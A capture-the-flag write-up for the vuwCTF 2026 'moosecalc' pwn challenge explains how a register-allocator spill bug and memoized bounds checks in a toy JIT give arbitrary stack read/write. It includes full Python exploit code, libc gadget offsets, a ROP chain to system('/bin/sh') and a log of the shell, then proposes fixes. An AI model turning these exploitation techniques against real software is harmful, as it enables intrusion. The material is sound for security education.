# moosecalc — vuwCTF 2026 (pwn)

> The Moose Software Foundation have released their new, free, open-source calculator utility!
> JIT compiles to become certified blazingly fast and moose-safe.
> *Note: this code was implemented using the chasm library, but its implementation details are not necessary to solve this challenge.*
>
> Author: **maxster** · `nc moosecalc.challenges.2026.vuwctf.com 9975`

**Flag:** `VuwCTF{m00se_s4f3_n0T_m3m0rY_5Afe}`

---

## Table of contents

- [TL;DR](#tldr)
- [1. Recon](#1-recon)
- [2. The language and the compiler pipeline](#2-the-language-and-the-compiler-pipeline)
- [3. Bug #1 — bounds checks memoized per SSA register](#3-bug-1--bounds-checks-memoized-per-ssa-register)
- [4. Bug #2 — the spill-slot allocator is not actually LIFO](#4-bug-2--the-spill-slot-allocator-is-not-actually-lifo)
- [5. How the two combine](#5-how-the-two-combine)
- [6. Finding a weaponisable expression](#6-finding-a-weaponisable-expression)
- [7. The primitive](#7-the-primitive)
- [8. Stack layout](#8-stack-layout)
- [9. Leaks](#9-leaks)
- [10. ROP chain and stack alignment](#10-rop-chain-and-stack-alignment)
- [11. Full exploit](#11-full-exploit)
- [12. Fixing it](#12-fixing-it)

---

## TL;DR

`moosecalc` JIT-compiles a small expression language to x86-64. `_load(i)` / `_store(i, v)`
access a 1024-entry `double mem[]` on the stack and are bounds-checked at compile time — but:

1. the bounds check is **memoized by SSA register id**, so a value is only checked the *first*
   time it is used as an index; and
2. the register allocator's **spill-slot stack accounting is wrong** — it pops slots in
   *next-use* order while pushing them in *farthest-last-use* order, so a live spill slot can be
   overwritten by an unrelated value.

Together, an SSA value that was bounds-checked earlier gets silently replaced in its register by
an attacker-controlled one, and the later `_load`/`_store` reuses the stale "already checked"
flag. That yields an unchecked, full 64-bit `mem[]` index — arbitrary read **and** write —
which is enough to leak PIE + libc off the stack and ROP into `system("/bin/sh")`.

---

## 1. Recon

```
build.sh            gcc -o moosecalc moosecalc.c asm_x64.c -Wall -Wextra -lm
download_deps.sh    fetches aqilc/chasm asm_x64.{c,h}
moosecalc           ELF 64-bit PIE, not stripped
moosecalc.c         1209 lines — full source
libc.so.6           Ubuntu GLIBC 2.39-0ubuntu8.6
ld-linux-x86-64.so.2
```

Mitigations:

| Protection | State |
|---|---|
| RELRO | Full (`BIND_NOW`, `GNU_RELRO`) |
| Stack canary | Yes (`__stack_chk_fail` in `calculate_queries`) |
| NX | Yes (`GNU_STACK RW`) |
| PIE | Yes |
| ASLR | Yes (remote) |

Full source is given, so this is a code-audit challenge rather than a reversing one. Very
usefully, the binary ships a debug mode:

```c
if (getenv("JIT_DEBUG")) { print_ssa(result_var); print_ir(result_reg); }
```

`JIT_DEBUG=1` dumps both compiler IRs — this is the single most valuable tool for the whole
challenge, since it lets you *watch* the register allocator misbehave.

Usage is three stages: an expression, a variable-name line, then one line of values per query.
The JIT'd function is compiled **once** and then called **once per input line**, with `mem[]`
persisting across calls:

```c
static void calculate_queries(void)
{
	double mem[MEM_SIZE];
	memset(mem, 0, sizeof mem);
	read_var_line();
	while (init_vars()) {
		double result = calculator_func(inputs, mem);
		printf("%.17g\n", result);
	}
}
```

Two properties of this loop matter a lot later:

- **`%.17g` round-trips a double exactly** (17 significant digits uniquely identify an IEEE-754
  double), so anything we read out of memory comes back bit-perfect.
- **`strtod` accepts hex-float literals** (`0x1.5p+3`) and `nan(0x…)`, so we can *write* any
  64-bit pattern we like.

Together those give a clean 64-bit read/write channel once we have an OOB index.

---

## 2. The language and the compiler pipeline

```
source text ──tokenize()──► tokens
            ──parse()─────► SSA (unbounded virtual registers)
            ──generate_ir()► IR  (exactly 4 physical registers: A,B,C,D → xmm0..xmm3)
            ──jit_compile()► x86-64 machine code (chasm), mmap'd RWX
```

The interesting stage is `generate_ir()`, a linear-scan allocator over four registers with
spilling to a stack area:

```c
static struct var_loc var_locs[MAX_SSA];   /* where each SSA value lives */
static ssa_reg_t reg_owner[NUM_REGS];      /* SSA value in each phys reg, -1 = free */
static int last_use[MAX_SSA];              /* last insn that reads each SSA value */
static int nspill_slots;                   /* current spill-stack depth */
static int max_spill_slots;                /* high-water mark → frame size */
static int in_use[NUM_REGS];               /* regs pinned for the current insn */
static int bounds_checked[MAX_SSA];        /* SSA values already bounds-checked */
```

Memory intrinsics lower to:

```c
case IR_UN_INTRIN:  /* _load  */
    CVTTSD2SI rax, xmm_src
    MOVSD     xmm_dest, [r12 + rax*8]

case IR_BIN_INTRIN: /* _store */
    CVTTSD2SI rax, xmm_left
    MOVSD     [r12 + rax*8], xmm_right

case IR_CHECK_BOUNDS:
    CVTTSD2SI rax, xmm_reg
    CMP       rax, 1024
    JB        +4                 /* in bounds → skip */
    MOV       edi, eax
    MOV       rax, fail_oob
    CALL      rax
```

The check itself is fine: one **unsigned** compare rejects both negatives and `>= 1024`, and a
NaN/overflowing conversion produces `0x8000000000000000` which also fails. `r12` holds `mem`.
The index is a full 64-bit signed value, so *if* we can dodge the check we get an arbitrary
displacement from `mem`, not just a small overflow.

---

## 3. Bug #1 — bounds checks memoized per SSA register

`moosecalc.c:731-748` and `moosecalc.c:750-769`:

```c
case SSA_UN_INTRIN:
    src = ensure_reg(insn->un_intrin.src);
    if (insn->un_intrin.intrin == INTRIN_LOAD &&
        !bounds_checked[insn->un_intrin.src]) {
            /* only bounds check on the first usage of this ssa var */
            emit_ir((struct ir_insn){ .type = IR_CHECK_BOUNDS,
                                      .check_bounds = { src } });
            bounds_checked[insn->un_intrin.src] = 1;
    }
```

The reasoning looks airtight: SSA values are immutable, so checking one once is enough. And it
*would* be, if the mapping from SSA value → physical register were trustworthy.

Note the asymmetry that makes this exploitable: `bounds_checked[]` is keyed on the **SSA id**,
but the emitted `IR_CHECK_BOUNDS` validates **whatever is in physical register `src` right now**.
Nothing verifies those two refer to the same thing. Bug #2 is what makes them diverge.

---

## 4. Bug #2 — the spill-slot allocator is not actually LIFO

Spill slots are handed out from a counter:

```c
static enum ir_reg alloc_reg(ssa_reg_t sr)
{
	int victim = -1;
	for (enum ir_reg r = REG_A; r < NUM_REGS; r++) {
		if (reg_owner[r] < 0) { /* take the free register */ ... return r; }
		if (in_use[r]) continue;                       /* never spill a pinned reg */
		if (victim < 0 || last_use[reg_owner[r]] > last_use[reg_owner[victim]])
			victim = r;                            /* ← spill farthest-last-use */
	}
	...
	emit_ir((struct ir_insn){ .type = IR_SPILL,
	                          .spill = { .reg = victim, .slot = nspill_slots } });
	var_locs[reg_owner[victim]] = (struct var_loc){ VAR_SPILLED, { .slot = nspill_slots } };
	nspill_slots++;                                        /* ← push */
	...
}

static enum ir_reg ensure_reg(ssa_reg_t sr)
{
	if (var_locs[sr].state == VAR_REGISTER) return var_locs[sr].reg;
	int slot = var_locs[sr].slot;
	enum ir_reg r = alloc_reg(sr);
	emit_ir((struct ir_insn){ .type = IR_RESTORE, .restore = { r, slot } });
	nspill_slots--;                                        /* ← pop, unconditionally */
	return r;
}
```

`nspill_slots` is treated as a stack pointer, but:

- **pushes** are ordered by *farthest last use* (Belady-style victim selection);
- **pops** happen whenever a value is next needed, i.e. in *next-use* order.

Those are different orders. A value can have a very distant *last* use but a very near *next*
use, so it gets spilled first (bottom slot) and restored first — popping a slot that isn't the
top. `nspill_slots` then points *into* the middle of the live spill area, and the next spill
overwrites a slot that is still live.

Note also that `ensure_reg` returns early without pinning (`in_use[]`) when the value is already
in a register, so a subsequent `ensure_reg`/`alloc_reg` in the *same* IR instruction is free to
evict it — a second, independent way for a local register variable to stop meaning what the
compiler thinks it means.

You can see the corruption with `JIT_DEBUG=1` on almost any register-hungry expression:

```
  spill B -> [1]        ← live value parked in slot 1
  restore [0] -> B      ← pops slot 0 (not the top!), nspill_slots 2 → 1
  spill A -> [1]        ← clobbers slot 1, which is still live
  ...
  restore [1] -> D      ← D now holds A's value, not B's
```

---

## 5. How the two combine

The final exploit expression is

```
((_store(g, (a + (h * (e * _store(c, g)))))) * 0) + _load(c) + (_store(c, d) * 0)
```

`JIT_DEBUG=1` gives the two IRs. SSA first:

```
  r0   = load_var g        r7   = r2 * r6            r14  = load_var d
  r1   = load_var a        r8   = r1 + r7            r15  = store r4, r14
  r2   = load_var h        r9   = store r0, r8       r16  = load 0
  r3   = load_var e        r10  = load 0             r17  = r15 * r16
  r4   = load_var c        r11  = r9 * r10           r18  = r13 + r17
  r5   = store r4, r0      r12  = load r4            result: r18
  r6   = r3 * r5           r13  = r11 + r12
```

Every memory access is on `r4` (= variable `c`) or `r0` (= variable `g`) — both of which we will
keep at `0`. Now the register-allocated IR:

```
   1   A = load_input g
   2   B = load_input a
   3   C = load_input h
   4   D = load_input e
   5   spill A -> [0]          ; slot0 = g            nspill=1
   6   A = load_input c
   7   spill A -> [1]          ; slot1 = c            nspill=2
   8   restore [0] -> A        ; A = g   *** pops slot 0, not slot 1 ***  nspill=1
   9   check_bounds A          ; checks g … but records bounds_checked[r4] = 1
  10   spill B -> [1]          ; slot1 = a  *** CLOBBERS the live 'c' ***  nspill=2
  11   B = store A A
  12   B = D * B
  13   B = C * B
  14   restore [1] -> C        ; C = a   (should have been c)
  15   B = C + B
  16   check_bounds A          ; for r9's index r0 = g — fine
  17   A = store A B
  18   B = load 0
  19   A = A * B
  20   restore [1] -> B        ; B = a   (should have been c)
  21   C = load B              ; *** r12 = load r4, NO check — index is 'a' ***
  22   A = A + C
  23   C = load_input d
  24   B = store B C           ; *** r15 = store r4, NO check — index 'a', value 'd' ***
  25   C = load 0
  26   B = B * C
  27   A = A + B
       result: A
       (stack slots used: 2)
```

Walking the key lines:

- **Line 8** is bug #2 firing. Slot 0 (`g`) is popped while slot 1 (`c`) is still live, because
  `g`'s *last* use is far away but its *next* use is immediate. `nspill_slots` drops to 1.
- **Line 9** is bug #1 setting up the trap. The compiler is lowering `r5 = store r4, r0`, so it
  sets `bounds_checked[r4] = 1` — but the physical register `A` at this moment contains `r0`
  (`g`), not `r4` (`c`). The *value* `g` is validated; the *flag* is recorded against `c`.
- **Line 10** is the actual memory corruption inside the compiler: slot 1 still holds `c`, and
  it is overwritten with `a`.
- **Lines 21 and 24** are the payoff. Both are `r4`-indexed accesses, `bounds_checked[r4]` is
  already `1`, so no `check_bounds` is emitted — and the register they index through was restored
  from the clobbered slot, so it holds **`a`**.

Result: at runtime, `mem[(int64_t)a]` is read and then written, with **zero** bounds checking,
while `a` is a raw user-supplied `double`.

Line 11 (`B = store A A`) is a nice illustration of the second aliasing flavour mentioned above:
SSA said `store r4, r0`, but *both* operands ended up naming register `A`.

---

## 6. Finding a weaponisable expression

Finding *an* aliasing case by hand is easy; finding one whose corrupted register is a *directly
controlled variable*, and whose other accesses can't crash us, is fiddly. Rather than grind
through `JIT_DEBUG` by hand, I ported `tokenize()`, `parse()` and `generate_ir()` to Python
([`solve/model.py`](solve/model.py)) — about 150 lines, a mechanical transliteration including
the `goto`-based parser state machine.

The port was validated by rendering its IR in exactly `print_ir()`'s format and diffing against
the real binary over 500 randomly generated programs:

```
$ python3 solve/validate.py
compared 500, mismatches 0
```

With a trustworthy model, `simulate()` symbolically executes the IR: registers and spill slots
hold *symbols* (`('var','a')`, `('MUL', x, y)`, …) rather than numbers. Every `CHECK_BOUNDS`
adds the symbol currently in that register to a `checked` set; every `load`/`store` records its
index symbol and whether that symbol is in the set. An access is genuinely unchecked iff its
index symbol was never validated — which is exactly the property the C code gets wrong.

Then it's a search ([`solve/search3.py`](solve/search3.py)) over random expressions plugged into
the template

```
((FILLER) * 0) + _load(p) + (_store(q, s) * 0)
```

with these constraints:

- the **last** `load` is unchecked and its index symbol is a bare `('var', X)`;
- the **last** `store` is unchecked, index `('var', X)`, value `('var', V)`, with `X ≠ V`;
- **no other** access — checked or not — has an index symbol mentioning `X` or `V`.

That last constraint is the one that matters in practice. The naive search returns plenty of
expressions where the exploit variable is *also* used as a legitimately-checked index elsewhere,
so the moment you set it to an out-of-range value `fail_oob()` kills the process. The winning
expression only ever bounds-checks `g` and `c`, both of which we pin to `0`.

The template shape does the rest of the work: `FILLER * 0` and `_store(...) * 0` collapse to
`0.0`, so the printed result is `0.0 + mem[X] + 0.0` — and adding `0.0` is bit-exact for the
subnormal-range values that pointers decode to.

---

## 7. The primitive

```
expression: ((_store(g, (a + (h * (e * _store(c, g)))))) * 0) + _load(c) + (_store(c, d) * 0)
variables : a c d e g h
query line: <index> 0 <value> 0 0 0
```

Per input line, with `c = e = g = h = 0`:

```
print(mem[a]);  mem[a] = d;
```

`a` is an arbitrary signed 64-bit index (via `CVTTSD2SI`), `d` is an arbitrary 64-bit pattern
(via a hex-float literal). Note the read is sequenced **before** the write — `r12` precedes
`r15` — which is what makes the next trick work.

The one wrinkle is that every read *also* writes. A read is therefore made non-destructive by
doing it twice: read (leaving `0`), then write the value straight back:

```python
def read(t, idx):
    v = query(t, idx, 0)   # returns old contents, leaves 0 behind
    query(t, idx, v)       # put it back
    return v
```

This matters — probing the stack walks straight over `calculate_queries`'s canary at index 1025,
and `__stack_chk_fail` would abort us before the ROP chain ever ran. Restoring each value keeps
the canary intact without ever needing to know what it is.

Sanity check that the check is really gone (`1030`/`1031` are past the end of `mem[]`):

```
$ printf '%s\na c d e g h\n0 0 0 0 0 0\n1030 0 0 0 0 0\n1031 0 0 0 0 0\n\n' "$E" | ./moosecalc
0
4.7811160946615622e+180
5.8504947321177184e-101
```

No `out of bounds memory access` — we're reading the stack.

---

## 8. Stack layout

`calculate_queries` disassembles to:

```
12c54:  push   rbp
12c55:  mov    rbp,rsp
12c58:  sub    rsp,0x1000
12c64:  sub    rsp,0x1000
12c70:  sub    rsp,0x20
12c74:  mov    rax,QWORD PTR fs:0x28
12c7d:  mov    QWORD PTR [rbp-0x8],rax       ; canary
12c83:  lea    rax,[rbp-0x2010]              ; mem
...
12cf6:  mov    rax,QWORD PTR [rbp-0x8]
12cfa:  sub    rax,QWORD PTR fs:0x28
12d03:  je     12d0a
12d05:  call   __stack_chk_fail
12d0a:  leave
12d0b:  ret
```

So `mem == rbp - 0x2010`, i.e. `&mem[1026] == rbp`. And `main` does `push rbp; mov rbp,rsp;
sub rsp,0x1000; sub rsp,0x20`, then `call calculate_queries`, so
`rbp_cq == rbp_main - 0x1030` and `mem == rbp_main - 0x3040`. Every interesting slot is at a
**constant index**:

| index | address | contents |
|---|---|---|
| 0 … 1023 | `mem[]` | the sandbox |
| 1024 | `rbp_cq-0x10` | padding |
| **1025** | `rbp_cq-0x08` | **stack canary** |
| **1026** | `rbp_cq` | saved rbp = `rbp_main` |
| **1027** | `rbp_cq+0x08` | **return address → `main+0x15e` (0x12ea3)** |
| 1028–1029 | | padding / `main`'s locals |
| 1030 … 1543 | `rbp_main-0x1010` … | `main`'s `char line[4096]` (dead) |
| 1544 | `rbp_main` | saved rbp of `main` |
| **1545** | `rbp_main+0x08` | **return → `__libc_start_call_main+0x8a`** |

Confirmed by probing (`solve/probe.py`):

```
mem[1024] = 0x000057f3ec1bbc98
mem[1025] = 0xdd733c0cf0bf6a00   <- canary (low byte 0x00, as expected)
mem[1026] = 0x00007ffeaa9ce260   <- rbp_main
mem[1027] = 0x000057f3ec1b2ea3   <- PIE
mem[1030] = 0x65726f74735f2828   <- "((_store"  (main's line[])
...
mem[1545] = 0x000071e02ac2a1ca   <- libc
mem[1549] = 0x000057f3ec1b2d45   <- &main, cross-checks PIE base 0x57f3ec1a0000
```

Indices 1027 onward are `main`'s dead frame, so the ROP chain has all the room it needs and
nothing to preserve.

---

## 9. Leaks

- **PIE**: `mem[1027] - 0x12ea3` (`0x12ea3` is the instruction after `call calculate_queries` in
  `main`).
- **libc**: `mem[1545] - 0x2a1ca`. `__libc_start_call_main` is a local symbol, so rather than
  guess I ran the binary locally and diffed the leak against `/proc/<pid>/maps`:

  ```
  libc base   = 0x766bd3400000
  mem[1545]   = 0x766bd342a1ca  -> libc+0x2a1ca
  ```

  The challenge ships its own `libc.so.6` and the binary is patched with
  `--set-interpreter ./ld-linux-x86-64.so.2` / `--set-rpath $ORIGIN`, so the local offset is the
  remote offset.

An earlier idea — read `printf@got` through the arbitrary read — turns out to be self-defeating:
the read writes `0` to the address it read, and `calculate_queries` calls `printf` to print the
result *before* we get a chance to restore it. Leaking from dead stack frames avoids the problem
entirely.

Offsets used, all from the provided `libc.so.6` (Ubuntu glibc 2.39-0ubuntu8.6):

| symbol / gadget | offset |
|---|---|
| `pop rdi ; ret` | `0x10f78b` |
| `ret` | `0x02882f` |
| `system` | `0x058750` |
| `"/bin/sh"` | `0x1cb42f` |
| `__libc_start_call_main+0x8a` | `0x02a1ca` |

---

## 10. ROP chain and stack alignment

Overwrite from index 1027:

| index | value |
|---|---|
| 1027 | `libc + 0x02882f` (`ret`) |
| 1028 | `libc + 0x10f78b` (`pop rdi ; ret`) |
| 1029 | `libc + 0x1cb42f` (`"/bin/sh"`) |
| 1030 | `libc + 0x058750` (`system`) |

Then send a blank line: `init_vars()` returns 0, the query loop exits, the canary check passes
(we restored it), and `leave; ret` walks into the chain.

The bare `ret` at 1027 is an alignment shim. `rbp_cq` is 16-byte aligned, so `mem` is too, and
`&mem[N]` is 16-aligned for even `N`. Tracing it:

```
leave           rsp = &mem[1026];  pop rbp  →  rsp = &mem[1027]
ret             rip = mem[1027];             rsp = &mem[1028]   ≡ 0 (mod 16)
ret gadget      rip = mem[1028];             rsp = &mem[1029]   ≡ 8
pop rdi         rdi = mem[1029];             rsp = &mem[1030]   ≡ 0
ret             rip = mem[1030] = system;    rsp = &mem[1031]   ≡ 8   ✅
```

`system` is entered with `rsp ≡ 8 (mod 16)`, matching the normal post-`call` state its SSE paths
require. Without the shim you land on `≡ 0` and glibc's `movaps` faults.

---

## 11. Full exploit

Layout:

```
solve/
  model.py      port of tokenize/parse/generate_ir + symbolic IR simulation
  validate.py   diffs the port against the real binary's JIT_DEBUG output
  search3.py    searches for the constrained read/write primitive
  probe.py      dumps the stack around mem[]
  io.py         the read/write primitive
  exploit.py    leaks + ROP
```

### `solve/io.py` — the primitive

```python
import subprocess, struct, socket

EXPR = '((_store(g, (a + (h * (e * _store(c, g)))))) * 0) + _load(c) + (_store(c, d) * 0)'
VARLINE = "a c d e g h"     # a = index, d = value to write, rest pinned to 0

def d2b(x): return struct.unpack('<Q', struct.pack('<d', x))[0]
def b2d(u): return struct.unpack('<d', struct.pack('<Q', u))[0]

def fmt(u):
    """a string strtod() turns into exactly the bit pattern u"""
    e = (u >> 52) & 0x7ff
    if e == 0x7ff:                              # inf / NaN — float.hex() loses the payload
        m, s = u & ((1 << 52) - 1), "-" if u >> 63 else ""
        return s + ("inf" if m == 0 else "nan(0x%x)" % m)
    return float.hex(b2d(u))

def query(t, idx, val_bits=0):
    """prints mem[idx], then writes val_bits there"""
    t.send("%d 0 %s 0 0 0\n" % (idx, fmt(val_bits)))
    return d2b(float(t.readline().strip()))

def read(t, idx):                # non-destructive: read, then put it back
    v = query(t, idx, 0); query(t, idx, v); return v

def write(t, idx, val):
    query(t, idx, val)
```

### `solve/exploit.py`

```python
POP_RDI, RET, SYSTEM, BINSH = 0x10f78b, 0x02882f, 0x058750, 0x1cb42f
LIBC_LEAK_OFF = 0x2a1ca    # mem[1545] = __libc_start_call_main+0x8a
MAIN_RET_OFF  = 0x12ea3    # mem[1027] = main+0x15e

def pwn(target=None, cmd=None):
    t = mio.start(target)

    rbp_main = mio.read(t, 1026)
    pie      = mio.read(t, 1027) - MAIN_RET_OFF
    libc     = mio.read(t, 1545) - LIBC_LEAK_OFF
    assert pie & 0xfff == 0 and libc & 0xfff == 0, "leak sanity check failed"

    for i, v in enumerate([libc + RET, libc + POP_RDI, libc + BINSH, libc + SYSTEM]):
        mio.write(t, 1027 + i, v)

    t.send("\n")               # ends the query loop → calculate_queries returns → ROP
    time.sleep(0.4)
    if cmd: t.send(cmd + "\n")
    return t
```

### Run

```
$ python3 solve/exploit.py moosecalc.challenges.2026.vuwctf.com 9975
[+] rbp(main)  = 0x7ffc9f9d5190
[+] pie base   = 0x55f37c98b000
[+] libc base  = 0x7f343c1aa000
[+] mem[]      = 0x7ffc9f9d2150
[+] chain written at mem[1027..1030]
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
...
VuwCTF{m00se_s4f3_n0T_m3m0rY_5Afe}
```

---

## 12. Fixing it

**The spill stack.** `nspill_slots` cannot be a bare counter when pushes and pops are ordered by
different criteria. Either use a real free-list / occupancy bitmap:

```c
static int slot_used[MAX_SPILL];

static int spill_slot_alloc(void) {
	for (int s = 0; s < MAX_SPILL; s++)
		if (!slot_used[s]) { slot_used[s] = 1; return s; }
	fprintf(stderr, "error: out of spill slots\n"); exit(1);
}
static void spill_slot_free(int s) { slot_used[s] = 0; }
```

…or give every SSA value a permanently reserved slot. At minimum, `alloc_reg` must never hand
out a slot that some live `var_locs[].slot` still points at.

**The bounds-check cache.** Key the memoization on something that actually holds. Tracking "this
*physical register* currently holds a validated value, invalidated on every write to it" would be
sound; keying it on an SSA id while emitting a check against a physical register is not, because
nothing enforces that the two agree. The cheap, obviously-correct fix is to drop
`bounds_checked[]` and emit a check at every `_load`/`_store` — three instructions on a path that
already does a memory access.

**Belt and braces.** `ensure_reg()` should pin (`in_use[r] = 1`) even on the fast path where the
value is already resident, so a second `ensure_reg()` in the same IR instruction can't evict a
register a local variable is still naming. And a debug assertion that the register named by an
`IR_CHECK_BOUNDS` is owned by the SSA value being recorded would have caught this in minutes.

---

## Takeaways

- The interesting bug in a JIT challenge is usually not in the emitted code — the `CMP`/`JB`
  bounds check here is textbook-correct. It's in the *compiler's* bookkeeping about what that
  code means.
- "Only check it the first time" is a safe optimisation only as long as the identity it's keyed
  on is genuinely stable. Here it was keyed on SSA ids while being enforced on physical
  registers, and a separate allocator bug drove a wedge between the two.
- When a compiler is small enough to reimplement, reimplement it. A 150-line Python port,
  validated by diffing against `JIT_DEBUG` output, turned "stare at IR dumps until something
  clicks" into a constraint search that returned a ready-to-use primitive.
- `%.17g` plus `strtod`'s hex-float support is a complete 64-bit I/O channel. Worth remembering
  any time a challenge only seems to speak `double`.
